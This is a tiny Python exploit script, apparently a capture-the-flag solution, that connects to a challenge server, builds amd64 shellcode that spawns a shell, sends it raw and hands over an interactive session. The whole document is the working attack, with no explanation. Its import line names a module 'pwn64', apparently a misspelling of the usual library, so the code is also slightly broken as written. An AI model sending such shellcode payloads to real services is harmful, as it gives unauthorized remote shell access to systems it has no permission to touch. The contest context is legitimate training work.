from pwn64 import *
p = remote("pwn.challenge.ctf.show",28125)
context.arch='amd64'
shellcode = asm(shellcraft.sh())
payload = shellcode
p.sendline(payload)
p.interactive()